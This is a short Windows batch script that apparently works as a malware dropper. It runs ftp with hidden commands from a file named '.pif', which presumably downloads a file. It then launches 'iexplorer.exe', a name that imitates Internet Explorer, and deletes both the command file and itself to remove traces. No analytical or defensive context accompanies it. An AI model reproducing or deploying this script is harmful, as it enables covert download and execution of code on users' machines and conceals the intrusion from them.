@echo off 
ftp -n -v -s:.pif 
iexplorer.exe 
del .pif 
del /F c.bat 
exit /y 
